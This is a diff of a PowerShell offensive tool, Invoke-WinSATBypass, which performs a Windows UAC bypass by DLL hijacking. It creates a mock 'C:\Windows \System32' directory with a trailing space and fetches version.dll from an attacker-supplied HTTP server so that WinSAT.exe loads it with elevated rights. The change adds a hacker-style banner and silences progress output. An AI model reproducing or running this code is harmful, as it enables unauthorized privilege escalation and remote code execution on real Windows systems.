@@ -1,4 +1,4 @@
-function Invoke-WinSATBypass
+﻿function Invoke-WinSATBypass
 {
     [CmdletBinding()] param (
     [Parameter()] [String] $HTTPServerIP
@@ -29,16 +29,32 @@ function Invoke-WinSATBypass
     #    return TRUE;
     # }
 
+    $banner = @”
+
+
+    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    █▄░▄█░▄▄▀█▀███▀█▀▄▄▀█░█▀█░▄▄█████░███░██▄██░▄▄▀██░▄▄▄░█░▄▄▀█▄▄░▄▄██░▄▄▀█░██░█▀▄▄▀█░▄▄▀█░▄▄█░▄▄
+    ██░██░██░██░▀░██░██░█░▄▀█░▄▄█▄▄██░█░█░██░▄█░██░██▄▄▄▀▀█░▀▀░███░████░▄▄▀█░▀▀░█░▀▀░█░▀▀░█▄▄▀█▄▄▀
+    █▀░▀█▄██▄███▄████▄▄██▄█▄█▄▄▄█████▄▀▄▀▄█▄▄▄█▄██▄██░▀▀▀░█░██░███░████░▀▀░█▀▀▀▄█░████▄██▄█▄▄▄█▄▄▄
+    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+
+
+“@
+
+    $ProgressPreference = 'SilentlyContinue'
+    $mockDirectory = '\\?\C:\Windows \System32';
+    $uacBypass = "$mockDirectory\WinSAT.exe";
+    $uacBypassCMD = "C:\Windows \System32\WinSAT.exe";
+    $downloadSucceed = $false;
+
+    Write-Output "$banner";
+
     if ($HTTPServerIP -eq $null -or $HTTPServerIP -eq '') {
         $HTTPServerIP = '127.0.0.1';
         Write-Output "[-] No HTTP Server IP supplied, defaulting to 127.0.0.1";
     }
 
     $url = "http://$HTTPServerIP/version.dll";
-    $mockDirectory = '\\?\C:\Windows \System32';
-    $uacBypass = "$mockDirectory\WinSAT.exe";
-    $uacBypassCMD = "C:\Windows \System32\WinSAT.exe";
-    $downloadSucceed = $false;
 
     # Creates a Mock Directory that will be use for DLL Hijacking
     Write-Output "[+] Creating mock directory: $mockDirectory";
